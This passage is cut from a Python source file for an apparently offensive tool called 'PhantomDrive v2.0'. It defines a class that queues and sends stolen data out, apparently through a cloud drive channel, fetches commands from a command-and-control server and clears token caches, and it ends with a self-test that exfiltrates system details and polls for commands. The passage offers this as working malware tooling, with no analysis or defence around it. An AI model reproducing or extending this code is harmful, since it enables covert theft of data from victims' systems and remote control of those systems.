exfil_queue = ExfiltrationQueue(max_size=50, max_wait=180)  # 50 items or 3 minutes

# ============= MAIN INTERFACE =============
class PhantomDrive:
    """Main interface for Drive operations"""
    
    @staticmethod
    def exfil(data: Union[Dict, List], immediate: bool = False) -> bool:
        """
        Exfiltrate data
        
        Args:
            data: Data to exfiltrate
            immediate: If True, send immediately instead of queueing
        
        Returns:
            bool: Success status
        """
        if isinstance(data, list):
            data = {'items': data, 'type': 'list'}
        
        if immediate:
            return exfiltrate_data(data, 'drive')
        else:
            exfil_queue.add(data)
            return True
    
    @staticmethod
    def get_commands() -> List[Dict]:
        """Get commands from C2"""
        return fetch_commands()
    
    @staticmethod
    def check_health() -> Dict:
        """Check system health"""
        return health_check()
    
    @staticmethod
    def flush_queue() -> bool:
        """Force flush the exfiltration queue"""
        exfil_queue.flush()
        return exfil_queue.size() == 0
    
    @staticmethod
    def cleanup():
        """Cleanup temporary files and cache"""
        # Clear token cache
        token_mgr.clear_cache()
        
        # Clear old cache files
        cache_dir = Path(config.TOKEN_CACHE_DIR)
        if cache_dir.exists():
            for file in cache_dir.glob('*'):
                try:
                    if file.stat().st_mtime < time.time() - 86400:  # 24 hours
                        file.unlink()
                except:
                    pass
        
        logger.info("Cleanup completed")

# ============= TEST FUNCTION =============
if __name__ == '__main__':
    print("Testing PhantomDrive v2.0...")
    print("=" * 50)
    
    # Test health check
    print("\n1. Health Check:")
    health = PhantomDrive.check_health()
    for key, value in health.items():
        print(f"  {key}: {value}")
    
    # Test exfiltration
    print("\n2. Test Exfiltration:")
    test_data = {
        'test': True,
        'timestamp': time.time(),
        'system': sys.platform,
        'version': '2.0'
    }
    
    success = PhantomDrive.exfil(test_data, immediate=True)
    print(f"  Immediate exfiltration: {'SUCCESS' if success else 'FAILED'}")
    
    # Test queue
    print("\n3. Testing Queue:")
    for i in range(5):
        PhantomDrive.exfil({'item': i, 'data': 'x' * 100})
    
    print(f"  Queue size: {exfil_queue.size()}")
    
    # Test command fetch
    print("\n4. Testing Command Fetch:")
    commands = PhantomDrive.get_commands()
    print(f"  Commands received: {len(commands)}")
    
    # Cleanup
    print("\n5. Cleanup:")
    PhantomDrive.cleanup()
    
    print("\n" + "=" * 50)
    print("Test completed!")
